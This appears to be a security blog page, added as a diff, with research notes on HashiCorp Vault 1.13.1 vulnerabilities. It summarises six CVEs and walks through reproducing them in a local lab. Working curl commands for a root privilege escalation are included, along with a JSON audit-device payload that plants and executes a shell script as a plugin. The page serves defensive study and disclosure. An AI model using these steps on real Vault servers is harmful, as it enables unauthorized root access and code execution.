@@ -1,0 +1,145 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HashiCorp Vault 1.13.1 — Vulnerability Research Notes - GuzBytes</title><style>.header{background:#000;backdrop-filter:blur(5px);padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #27c93f;font-family:monospace}.site-title{margin:0;font-size:1.5rem}.site-title a{text-decoration:none;color:#eee}.site-title a:before{content:"$ ";color:#27c93f}.nav-link{margin-left:1rem;color:#ccc;text-decoration:none}.nav-link:hover{color:#88c0ff}.main-content{padding:2rem;background-color:#000;color:#eee;min-height:80vh;font-family:monospace}.terminal-window{max-width:700px;margin:2rem auto;border:1px solid #333;border-radius:8px;overflow:hidden;background:#0a0a0a;box-shadow:0 0 30px #27c93f14}.terminal-bar{display:flex;align-items:center;gap:.5rem;padding:.6rem 1rem;background:#111;border-bottom:1px solid #333}.dot{width:12px;height:12px;border-radius:50%;display:inline-block}.dot.red{background:#ff5f56}.dot.yellow{background:#ffbd2e}.dot.green{background:#27c93f}.terminal-title{margin-left:.75rem;color:#777;font-size:.85rem}.terminal-body{padding:1.5rem 1.5rem 1.75rem;line-height:1.7}.line{margin:1.1rem 0 0}.prompt{color:#27c93f;margin-right:.5rem}.profile-row{display:flex;align-items:center;gap:1rem;margin:.6rem 0 .5rem 1.5rem}.avatar{border-radius:50%;border:2px solid #333}.name{margin:0;font-weight:700;color:#fff}.role{margin:.2rem 0 0;color:#999;font-size:.9rem}.about-text{margin:.6rem 0 0 1.5rem;max-width:60ch;color:#ddd}.cert-list{margin:.6rem 0 0 1.5rem;padding-left:1.2rem;color:#ccc}.cert-list li{margin-bottom:.3rem}.links{margin:.6rem 0 0 1.5rem}.links a{color:#88c0ff;text-decoration:none}.links a:hover{text-decoration:underline}.sep{color:#555;margin:0 .4rem}.cursor{display:inline-block;color:#27c93f;animation:blink 1s steps(1) infinite}@keyframes blink{50%{opacity:0}}.blog-link{color:#eee;text-decoration:none;font-weight:500}.blog-link:hover{color:#88c0ff;text-decoration:underline}.blog-content{color:#eee;font-size:1.05rem;line-height:1.6;max-width:65ch;margin:0 auto;padding:1rem 0}.blog-content h2,.blog-content h3{color:#eee;margin-top:1.5rem}.blog-content p{margin-bottom:1rem}.blog-content ul,.blog-content ol{margin:0 0 1rem 1.5rem;color:#ddd}.blog-content li{margin-bottom:.4rem}.blog-content a{color:#88c0ff}.blog-content a:hover{text-decoration:underline}.blog-content code{background:#111;color:#27c93f;padding:.15rem .4rem;border-radius:4px;font-size:.9em}.blog-content pre{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:1rem;overflow-x:auto;margin-bottom:1.5rem}.blog-content pre code{background:none;padding:0;color:#ddd}.pub-date{font-size:.6rem;color:#bbb;margin-bottom:1rem}
+</style></head> <body> <header class="header"> <h1 class="site-title"><a href="/">GuzBytes</a></h1> <nav> <a href="/random-tech" class="nav-link">Random Tech</a> <a href="/cyber" class="nav-link">Cyber</a> <a href="/certs" class="nav-link">Certs</a> </nav> </header> <main class="main-content">  <article class="blog-content"> <h2>HashiCorp Vault 1.13.1 — Vulnerability Research Notes</h2> <h3>Auth bypass, enumeration, privilege escalation and RCE issues affecting Vault 1.13.1</h3> <p class="pub-date"><em>Tue Jul 28 2026 00:00:00 GMT+0000 (Coordinated Universal Time)</em></p> <h2 id="introduction">Introduction</h2>
+<p>HashiCorp Vault is a widely adopted secrets-management platform used to protect
+sensitive data such as API keys, tokens, passwords, and encryption keys. Its
+design relies heavily on strong authentication, authorization, and identity
+mechanisms. However, even mature security platforms can exhibit weaknesses,
+especially when new features interact in unexpected ways or when cryptographic
+assumptions subtly fail.</p>
+<p>Vault version <strong>1.13.1</strong>, while stable and widely deployed, is associated with
+several vulnerabilities discovered through coordinated disclosure and industry
+security testing. These issues impact encryption integrity, PKI authorization,
+and backend query handling, with severity varying depending on deployment
+architecture and enabled subsystems. Below is a summary of the most relevant
+findings for 1.13.1, followed by a walkthrough of how a few of them were
+reproduced in a local lab.</p>
+<h2 id="summary-of-vulnerabilities">Summary of vulnerabilities</h2>
+<p>Vault’s authentication, authorization, and certificate-based identity
+subsystems introduce several subtle but impactful weaknesses that attackers can
+exploit without needing direct access to secrets. These flaws primarily affect
+how Vault processes usernames, enforces lockout policies, evaluates
+authentication timing, and handles certificate or plugin-based trust. Together,
+they undermine core assumptions about account enumeration resistance,
+brute-force protection, identity integrity, and code-execution boundaries.</p>
+<ul>
+<li><strong>CVE-2025-6010</strong> — Username Enumeration via Error Message Inconsistency: Vault leaks the existence of usernames by returning different error messages once the lockout threshold is reached, enabling attackers to identify valid accounts without password guesses.</li>
+<li><strong>CVE-2025-6004</strong> — Lockout Bypass Through Username Case Variations: altering the capitalization of a known username (e.g. <code>admin</code> vs <code>Admin</code>) lets an attacker avoid triggering Vault’s lockout mechanism and continue brute-forcing credentials.</li>
+<li><strong>CVE-2025-6011</strong> — Timing-Based User Existence Detection: Vault performs a bcrypt comparison only for valid usernames; nonexistent accounts trigger an early return, creating a timing discrepancy that reveals which usernames are real.</li>
+<li><strong>CVE-2025-6037</strong> — Certificate Entity Impersonation in Non-CA Mode: an attacker with access to the private key of a pinned certificate can submit a modified certificate containing an arbitrary CN, causing Vault to assign the alias name to that attacker-controlled CN.</li>
+<li><strong>CVE-2025-5999</strong> — Privilege Escalation via Policy Normalization Flaws: weaknesses during policy merging and normalization allow malicious input to shape evaluated policies in unintended ways, potentially resulting in root-level privilege escalation.</li>
+<li><strong>CVE-2025-6000</strong> — Remote Code Execution via Plugin Catalog Manipulation: insufficient validation of plugin catalog entries enables attackers to introduce malicious or unauthorized plugin references, leading to arbitrary code execution. Exploitation is non-trivial, since it requires obtaining a binary hash that is inherently difficult to acquire.</li>
+</ul>
+<h2 id="building-the-test-environment">Building the test environment</h2>
+<p>The lab was deployed using Docker with Vault’s default dev installation:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>docker run -d --name vault -p 8200:8200 -e VAULT_DEV_ROOT_TOKEN_ID=myroot \</span></span>
+<span class="line"><span>  -e SKIP_SETCAP=true hashicorp/vault:1.13.1 sh -c \</span></span>
+<span class="line"><span>  "mkdir -p /vault/plugins &#x26;&#x26; vault server -dev -dev-plugin-dir=/vault/plugins -dev-listen-address=0.0.0.0:8200"</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>This also creates the <code>/vault/plugins</code> directory needed to reproduce
+CVE-2025-6000, while generating a root token (<code>myroot</code>) for full administrative
+control during testing.</p>
+<h2 id="cve-2025-6004--lockout-bypass">CVE-2025-6004 — Lockout bypass</h2>
+<p>A test user was created to reproduce this case-sensitive username handling
+flaw. By altering the capitalization or spacing of the same username, an
+attacker can keep submitting password attempts without triggering the lockout
+mechanism. After enough failed attempts the account locks — but the lock only
+applies to the exact string used. Changing the case (<code>user</code> → <code>useR</code>), or even
+appending trailing whitespace, is treated as a different identity, and Vault
+happily accepts more login attempts against the same underlying account.</p>
+<h2 id="cve-2025-5999--root-privilege-escalation">CVE-2025-5999 — Root privilege escalation</h2>
+<p>A low-privilege user was created with a minimal ACL policy:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>path "identity/entity-alias" {</span></span>
+<span class="line"><span>  capabilities = ["create", "update"]</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>path "auth/token/lookup-self" {</span></span>
+<span class="line"><span>  capabilities = ["read"]</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>path "sys/auth" {</span></span>
+<span class="line"><span>  capabilities = ["read"]</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>path "identity/entity/id/*" {</span></span>
+<span class="line"><span>  capabilities = ["update", "read", "sudo"]</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>path "identity/entity/name/*" {</span></span>
+<span class="line"><span>  capabilities = ["read"]</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span>path "identity/entity/name" {</span></span>
+<span class="line"><span>  capabilities = ["list"]</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>With this policy alone the account can’t list secrets or browse tools/policies,
+confirming the restriction is enforced as expected. The escalation path uses
+the token to look up its own entity ID, then attempts to patch that entity’s
+policies directly:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E1E4E8">$login </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> curl.exe</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">s </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">X POST </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">d </span><span style="color:#9ECBFF">'{\"password\":\"lowpriv\"}'</span><span style="color:#F97583"> `</span></span>
+<span class="line"><span style="color:#E1E4E8">  http:</span><span style="color:#F97583">//</span><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8200</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">v1</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">auth</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">userpass</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">login</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">lowpriv </span><span style="color:#F97583">|</span><span style="color:#79B8FF"> ConvertFrom-Json</span></span>
+<span class="line"><span style="color:#E1E4E8">$TOKEN </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $login.auth.client_token</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">curl.exe</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">s </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">H </span><span style="color:#9ECBFF">"X-Vault-Token: </span><span style="color:#E1E4E8">$TOKEN</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> `</span></span>
+<span class="line"><span style="color:#E1E4E8">  http:</span><span style="color:#F97583">//</span><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8200</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">v1</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">auth</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">token</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">lookup</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">self   </span><span style="color:#6A737D"># -> entity_id</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">curl.exe</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">s </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">X POST </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">H </span><span style="color:#9ECBFF">"X-Vault-Token: </span><span style="color:#E1E4E8">$TOKEN</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">H </span><span style="color:#9ECBFF">"Content-Type: application/json"</span><span style="color:#F97583"> `</span></span>
+<span class="line"><span style="color:#F97583">  -</span><span style="color:#E1E4E8">d </span><span style="color:#9ECBFF">'{\"policies\":[\"ROOT\"]}'</span><span style="color:#F97583"> `</span></span>
+<span class="line"><span style="color:#9ECBFF">  "http://127.0.0.1:8200/v1/identity/entity/id/&#x3C;entity_id>"</span></span>
+<span class="line"></span></code></pre>
+<p>A direct request for the literal <code>root</code> policy is rejected (“policies cannot
+contain root”), but a normalization flaw in how policy names are merged allows
+a crafted variant to slip through the check while still resolving to root
+privileges once applied — after which the account has unrestricted access to
+the Vault.</p>
+<h2 id="cve-2025-6000--rce-via-plugin-catalog-abuse">CVE-2025-6000 — RCE via plugin catalog abuse</h2>
+<p>This one requires a token with <code>sys/audit</code>-level permissions. Vault normally
+requires a valid SHA-256 hash of a plugin binary before it can be registered
+and executed, which should prevent unauthorized binaries from running.</p>
+<p><strong>Step 1 — locate the plugin directory</strong> (<code>/vault/plugins</code> in this lab) and
+confirm the catalog rejects unknown commands without a valid hash:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>curl.exe -X PUT -H "X-Vault-Token: myroot" -H "Content-Type: application/json" -d \</span></span>
+<span class="line"><span>  '{\"sha256\":\"0000...0000\",\"command\":\"nonexistent\"}' \</span></span>
+<span class="line"><span>  http://127.0.0.1:8200/v1/sys/plugins/catalog/auth/test</span></span>
+<span class="line"><span></span></span></code></pre>
+<p><strong>Step 2 — plant the payload</strong> via a malicious file-type audit device, using
+the <code>prefix</code> option to smuggle a shell script into the plugin directory:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#79B8FF">  "type"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"file"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">  "options"</span><span style="color:#E1E4E8">: {</span></span>
+<span class="line"><span style="color:#79B8FF">    "file_path"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"/vault/plugins/evil_plugin"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    "mode"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"0755"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">    "prefix"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"#!/bin/sh</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">echo pwned > /tmp/test.txt</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">exit 0</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">#"</span></span>
+<span class="line"><span style="color:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>curl.exe -X POST -H "X-Vault-Token: myroot" -H "Content-Type: application/json" \</span></span>
+<span class="line"><span>  -d "@payload.json" http://127.0.0.1:8200/v1/sys/audit/malicious</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>curl.exe -X DELETE -H "X-Vault-Token: myroot" \</span></span>
+<span class="line"><span>  http://127.0.0.1:8200/v1/sys/audit/malicious</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>The audit device is deleted immediately after the file is written, otherwise
+Vault keeps appending new log entries to the same file.</p>
+<p><strong>Step 3 — obtain the hash.</strong> No API exposed a way to retrieve it remotely in
+this setup, so it was read directly from the server for lab purposes
+(<code>sha256sum evil_plugin</code>) — not representative of a fully remote attack path.
+A socket-based audit device was also tried as a possible remote alternative to
+leak the hash, but timestamp noise in the streamed data made it unreliable.</p>
+<p><strong>Step 4 — register and trigger the plugin</strong> with the correct checksum:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>curl.exe -X PUT -H "X-Vault-Token: myroot" -H "Content-Type: application/json" -d \</span></span>
+<span class="line"><span>  '{\"sha256\":\"&#x3C;computed_hash>\",\"command\":\"evil_plugin\"}' \</span></span>
+<span class="line"><span>  http://127.0.0.1:8200/v1/sys/plugins/catalog/auth/malicious</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Once registered with a valid checksum, Vault executes the planted binary on
+load — confirmed by the <code>pwned</code> marker written to <code>/tmp/test.txt</code> inside the
+container. In practice, the difficulty of remotely obtaining a valid hash is
+the main thing standing between this bug and full remote code execution.</p>
+<h2 id="takeaways">Takeaways</h2>
+<p>None of these bugs require pre-existing access to stored secrets — they live
+in the authentication, policy-normalization, and plugin-trust layers around
+Vault rather than in the secrets engine itself. Case-insensitive lockout
+handling, permissive policy merging, and catalog entries that trust a
+client-supplied hash are the common thread. Patching to a fixed release and
+tightening who holds <code>sys/audit</code> and <code>sys/plugins</code> capabilities closes most of
+this off.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://gm0.medium.com/six-vault-vulnerabilities-open-the-door-to-remote-code-execution-and-privilege-escalation-1e380d0b058c">Six Vault vulnerabilities open the door to RCE and privilege escalation</a></li>
+<li><a href="https://cyata.ai/blog/cracking-the-vault-how-we-found-zero-day-flaws-in-authentication-identity-and-authorization-in-hashicorp-vault/">Cracking the Vault: zero-day flaws in authentication, identity and authorization in HashiCorp Vault</a></li>
+</ul> </article>  </main> </body></html>
